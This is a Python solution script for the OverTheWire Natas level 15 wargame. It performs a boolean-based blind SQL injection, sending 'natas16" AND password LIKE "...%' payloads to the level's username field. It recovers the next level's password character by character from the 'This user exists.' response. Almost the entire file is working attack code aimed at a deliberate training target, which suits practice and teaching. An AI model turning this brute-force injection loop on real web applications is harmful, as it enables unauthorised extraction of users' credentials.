#!/bin/env python3

import os
import requests as rq

import signal
import sys

try:
    natas15pass = os.environ['natas15pass']
except:
    print('run source hackall.sh')
    exit(1)

def mkReqWithPayload(pl):
    return rq.post(
        url = 'http://natas15.natas.labs.overthewire.org/',
        auth = ('natas15', natas15pass),
        params = {
            'debug': '1'
        },
        data = {
            'username': pl
        }
    )

dict = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
plTemplate = 'natas16" AND password LIKE "'

passwd = ''
bkp_path = 'natas16/.password'
if os.path.exists(bkp_path):
    bkp = open(bkp_path, 'rb')
    passwd = bkp.read().decode('utf-8')
    print('restored:', passwd)
    bkp.close()

print('\033[?25l', end = '')

bkp = open(bkp_path, 'wb')

def sigint_handler(sig, frame):
    print('\nSIGINT recieved')
    exit_gracefully()

def exit_gracefully():
    print('\033[?25h', end = '')
    bkp.close()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)
      
while len(passwd) < 32:
    for i in dict:
        pl = plTemplate + passwd + i + '%'
        r = mkReqWithPayload(pl)
        if r.ok: 
            print('\rtried:', passwd + i, end = '')
            if r.text.find('This user exists.') > -1:
                print('\rhit:  ', passwd)
                passwd += i
                bkp.write(passwd.encode('ascii'))
                break
    if passwd == '': raise 'failed'

print('password =', passwd)

exit_gracefully()
